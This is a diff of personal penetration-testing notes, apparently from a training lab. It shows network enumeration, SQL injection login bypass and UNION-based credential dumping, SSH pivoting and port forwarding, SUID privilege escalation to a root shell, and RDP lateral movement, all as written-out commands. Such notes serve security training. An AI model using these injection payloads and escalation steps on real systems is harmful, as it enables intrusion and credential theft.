@@ -182,24 +182,6 @@ NOTES
     • 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 #### Step 1 ####
 --Port Scanning IP & enumerate--
 nmap -p 80 --script=http-enum <IP address>    (Locates useful libraries that should be looked into)
@@ -229,7 +211,7 @@ vulnerable#   cat /var/ww/.ssh/authorized_keys
 URL/<IP address>/login.php?username=bob' OR 1='1&passwd=bob' OR 1='1    (Gather all contents into login.php)
 
 --Upload link reveals that malicious injection could be used--
-
+-------------------------------------------------------------------------------------------------------------------
 
 #### Step 3 ####
 -Create Master Socket-
@@ -253,6 +235,63 @@ user2@public#  sudo -l
   select * from session_log;
   select * from user;
   exit
+  <ping sweep script>  (identify all IP in network)
+                        192.168.28.165
+                        192.168.28.175
+
+lin-ops#  ssh -S /tmp/jump jump -O forward  -D9050
+lin-ops#  proxychains nmap 192.168.28.175        192.168.28.165
+                            port 2222, 8000        port 22, 8888
+                                              
+lin-ops#  ssh -S /tmp/jump jump -O forward -L1111:192.168.28.175:8000
+-----------------------------------------------------------------------
+127.0.0.1:1111
+#SQL Injection#
+product=1 or 1=1    (keep incrementing product #)
+product=7 UNION SELECT 1,2,3    (identify amount of columns)
+product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns    (Golden statement/Search for user created)
+                                                    information_schema
+                               DEFAULT DATABASES    mysql
+                                                    performance_schema
+
+product=7 UNION SELECT user_id,name,username FROM siteusers.users    (credentials located)
+
+lin-ops#  ssh -S /tmp/jump jump -O forward -L2222:192.168.28.165:22
+lin-ops#  ssh -MS /tmp/Round user3@127.0.0.1 -p 2222
+
+lin-ops#  ssh -S /tmp/Round jump
+$  shell
+user3@Round#  sudo -l
+  ls /var/tmp
+  ps -elf
+  cat /etc/crontab
+  find / -type f -perm /6000 2>/dev/null -ls    (find vulnerable binaries)
+  gtfobins  (input suspicious binaries to identify vulnerability) #FIND# #SUID#
+  find . -exec /bin/sh -p \; -quit
+
+# whoami    (root)
+  ls -la /root
+  cat ab.sh    (listening port found)
+  cat RE_ME.obs    (reverse engineering)
+      ---IN GHIDRA >> MEANS BIT SHIFT---
+          bit shift calculator 
+            right means left
+
+# <ping sweep script>    (192.168.28.189 found)
+--------------------------------------------------
+lib-ops#  ssh -S /tmp/jump jump -O cancel -D 9050
+lin-ops#  ssh -S /tmp/Round jump -O forward -D 9050
+lin-ops#  proxychains nmap 192.168.28.189
+                            ports 22, 135, 139, 445, 3389, 5357, 9999
+lin-ops#  ssh -S /tmp/Round jump -O forward -L3333:192.168.28.189:22 -L4444:192.168.28.189:3389 
+lin-ops#  ssh -MS /tmp/Winders Aaron@127.0.0.1 -p 3333
+lin-ops#  ssh -S /tmp/Winders jump 
+
+lin-ops#  xfreerdp /u:Aaron /v:localhost:4444 /dynamic-resolution +clipboard    (Add correct hostkey to filepath)
+
+
+
+
 
 
 
